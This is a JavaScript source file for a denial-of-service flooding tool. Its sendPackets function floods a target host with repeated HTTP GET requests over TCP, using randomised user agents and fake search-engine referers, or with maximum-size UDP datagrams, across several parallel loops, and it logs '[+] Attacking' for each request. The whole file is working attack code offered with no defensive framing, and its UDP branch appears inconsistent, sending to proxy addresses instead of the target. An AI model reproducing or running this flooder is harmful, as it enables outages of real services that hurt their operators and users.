import net from "net";
import dgram from "dgram";
import { acceptall } from "./acceptall.js";
import { fetchProxies } from "./fetchProxies.js";
import { useragents } from "./useragents.js";

const ref = [
  "http://www.bing.com/search?q=",
  "https://www.yandex.com/yandsearch?text=",
  "https://duckduckgo.com/?q=",
];

export function sendPackets(host, port, timeout, protocol, packets, threads) {
  const maxMessageSize = 65507;
  let message = "X".repeat(maxMessageSize);

  const startTime = new Date();
  const interval = 100; // Delay in milliseconds between packets

  function startFlood() {
    const userAgent =
      "User-Agent: " +
      useragents[Math.floor(Math.random() * useragents.length)] +
      "\r\n";
    const accept = acceptall[Math.floor(Math.random() * acceptall.length)];
    const referer =
      "Referer: " + ref[Math.floor(Math.random() * ref.length)] + host + "\r\n";
    const content = "Content-Type: application/x-www-form-urlencoded\r\n";
    const length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n";
    const targetHost = `GET / HTTP/1.1\r\nHost: ${host}:${port}\r\n`;
    const mainReq =
      targetHost + userAgent + accept + referer + content + length + "\r\n";

    let sentPackets = 0;

    function sendPacket() {
      if (protocol === "UDP") {
        const socket = dgram.createSocket("udp4");

        function sendUdpPacket(proxy) {
          if (timeout) {
            const currentTime = new Date();
            if (currentTime.getTime() >= startTime.getTime() + timeout) {
              console.log("Timeout reached, stopping packet sending.");
              return;
            }
          }

          const buffer = Buffer.from(message);
          const targetPort = port || Math.floor(Math.random() * 65535 + 1);
          socket.send(
            buffer,
            0,
            buffer.length,
            targetPort,
            proxy.ip,
            function (err, bytes) {
              if (err) throw err;
              console.log(
                `UDP packet sent to ${proxy.ip}:${targetPort} via proxy ${proxy.ip}:${proxy.port}`
              );
            }
          );

          setTimeout(() => sendUdpPacket(proxy), interval);
        }

        fetchProxies((proxies) => {
          if (proxies.length > 0) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            sendUdpPacket(proxy);
          } else {
            console.error("No proxies available.");
          }
        });
      } else if (protocol === "TCP") {
        const client = new net.Socket();

        client.connect(port, host, () => {
          console.log(`TCP connection established to ${host}:${port}`);
          function sendTcpPacket() {
            if (timeout) {
              const currentTime = new Date();
              if (currentTime.getTime() >= startTime.getTime() + timeout) {
                console.log("Timeout reached, stopping packet sending.");
                client.end();
                return;
              }
            }

            client.write(mainReq, (err) => {
              if (err) throw err;
              console.log(`TCP packet sent to ${host}:${port}`);
            });

            for (let i = 0; i < packets; i++) {
              client.write(mainReq, (err) => {
                if (err) throw err;
                sentPackets++;
                console.log(
                  `[+] Attacking ${host}:${port} | Sent: ${sentPackets}`
                );
              });
            }
          }

          sendTcpPacket();
        });

        client.on("error", (err) => {
          console.error(`TCP connection error: ${err.message}`);
        });

        client.on("close", () => {
          console.log("TCP connection closed");
        });

        setTimeout(sendPacket, 1000 / packets);
      }
    }

    sendPacket();
  }

  for (let i = 0; i < threads; i++) {
    startFlood();
  }
}
